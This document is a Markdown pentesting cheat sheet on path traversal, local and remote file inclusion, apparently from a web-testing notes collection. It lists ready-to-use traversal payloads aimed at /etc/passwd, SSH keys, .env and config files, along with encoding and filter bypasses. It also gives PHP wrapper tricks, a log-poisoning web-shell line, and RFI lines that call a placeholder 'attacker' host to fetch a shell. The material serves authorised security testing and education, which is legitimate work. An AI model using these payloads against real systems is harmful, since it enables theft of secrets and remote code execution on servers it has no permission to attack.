# Path Traversal / LFI / RFI

**TL;DR**: you control a file path read/included by the server → arbitrary file read (LFI), sometimes RCE (inclusion + log poisoning, PHP wrappers, RFI). PoC: read a known harmless file (`/etc/hostname`, `web.config`).

## Where to look
- File params: `file`, `path`, `page`, `template`, `doc`, `download`, `read`, `include`, `view`, `img`, `attachment`, `filename`, `lang`, `theme`, `dir`, `folder`.
- Features: download/export, document viewer, language/theme selector, avatars, log viewer, "preview", plugins/themes, i18n, ZIP extraction (Zip Slip), archive upload.

## Base payloads
- `../../../../etc/passwd`, `..\..\..\..\windows\win.ini`.
- Absolute: `/etc/passwd`, `C:\windows\win.ini`, `file:///etc/passwd`.
- Linux targets: `/etc/passwd`, `/etc/hostname`, `/proc/self/environ`, `/proc/self/cmdline`, `/proc/self/fd/*`, `/etc/hosts`, SSH keys `~/.ssh/id_rsa`, `/var/log/...`.
- Windows targets: `C:\windows\win.ini`, `\boot.ini`, `web.config`, `C:\inetpub\logs\...`, `C:\Windows\System32\drivers\etc\hosts`.
- App configs: `.env`, `config.php`, `wp-config.php`, `application.properties`, `appsettings.json`, `settings.py`, `.git/config`.

## Filter bypass (see also 00_WAF_ENCODING.md)
- Nested (non-recursive strip): `....//`, `..././`, `....\/`, `..;/`.
- Encoding: `%2e%2e%2f`, double `%252e%252e%252f`, unicode `%c0%ae`, `%uff0e`.
- Slash/backslash mix (Windows): `..%5c`, `%2e%2e%5c`.
- Null byte (old PHP <5.3): `../../etc/passwd%00.png`.
- Forced extension: if `.php`/`.html` appended → wrappers or path truncation (old versions), or `?` / `#`.
- Required prefix (`/var/www/images/`): start with the expected path then `../` (`images/../../../etc/passwd`), or a wrapper.
- Extension allowlist: `%00`, `;`, path truncation, or `....//` combined.

## PHP wrappers (LFI → source read / RCE)
- Encoded source read: `php://filter/convert.base64-encode/resource=index.php` → decode the b64.
- Filter chains (oracle / fileless RCE): advanced `php://filter` ("php_filter_chain" to build code without upload).
- `data://text/plain;base64,<payload>` → execution if `allow_url_include=On`.
- `expect://id`, `php://input` (POST body included), `zip://`, `phar://` (deserialization → RCE).

## LFI → RCE (techniques)
- **Log poisoning**: inject PHP into a log (`User-Agent: <?php system($_GET['c']);?>`) then include `/var/log/apache2/access.log`.
- **/proc/self/environ**: inject via User-Agent then include (if readable).
- **Session files**: `/var/lib/php/sessions/sess_<PHPSESSID>` with a controlled value.
- **Mail/upload**: include an uploaded file (avatar) containing PHP → see `FILE_UPLOAD.md`.
- **phar://** + deserialization gadget → `INSECURE_DESERIALIZATION.md`.
- **php_filter_chains**: RCE via wrappers alone (generator: synacktiv/php_filter_chain_generator).

## RFI (Remote File Inclusion)
- If `allow_url_include=On` (rare): `?file=http://attacker/shell.txt`. Also via SMB (Windows) `\\attacker\share\shell`.

## Related
- **Zip Slip**: archive whose entries contain `../` → write outside the folder on extraction.
- **Nginx alias traversal**: `location /x { alias ...; }` with a trailing slash lets `/x../` climb out (off-by-slash). `merge_slashes off` also re-opens `//..%2f` traversal.
- **Write path traversal** (upload): `filename=../../evil.php`.
- **Server-side path traversal** in internal calls (SSRF-like on the FS).

## Impact
- Secret read (`.env`, keys, source) = High. LFI→RCE = Critical.

## Caido
- Automate: traversal wordlist (SecLists `LFI/`) + grep-match on `root:x:` / `[extensions]` (win.ini) / `-----BEGIN`.
- Use Convert to generate the encoded variants.

## References
- PortSwigger - Path traversal - https://portswigger.net/web-security/file-path-traversal
- PayloadsAllTheThings - Directory Traversal - https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Directory%20Traversal
- PayloadsAllTheThings - File Inclusion (LFI/RFI) - https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion
- OWASP WSTG - Directory Traversal / File Include - https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_Directory_Traversal_File_Include
- php_filter_chain_generator - https://github.com/synacktiv/php_filter_chain_generator
- HackTricks - LFI/RFI - https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/
